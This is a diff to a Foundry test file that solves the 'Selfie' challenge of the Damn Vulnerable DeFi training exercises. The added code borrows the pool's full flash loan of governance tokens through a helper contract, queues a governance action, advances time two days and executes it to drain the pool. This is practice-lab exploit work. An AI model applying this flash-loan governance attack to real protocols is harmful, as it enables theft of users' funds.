@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieRecovery} from "./SelfieRecovery.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +64,22 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieRecovery selfieRecovery = new SelfieRecovery(address(pool), address(governance), recovery);
+
+        // Obtain the actionId that's going to be used
+        uint256 actionId = governance.getActionCounter();
+
+        // And the total amount of tokens we can borrow
+        uint256 maxFlashLoan = pool.maxFlashLoan(address(token));
+
+        bool success = pool.flashLoan(IERC3156FlashBorrower(address(selfieRecovery)), address(token), maxFlashLoan, "");
+        require (success, "Flash loan failed");
+
+        // Simulating the pass of time
+        vm.warp(block.timestamp + 2 days);
+
+        // Execute the action created
+        governance.executeAction(actionId);
     }
 
     /**
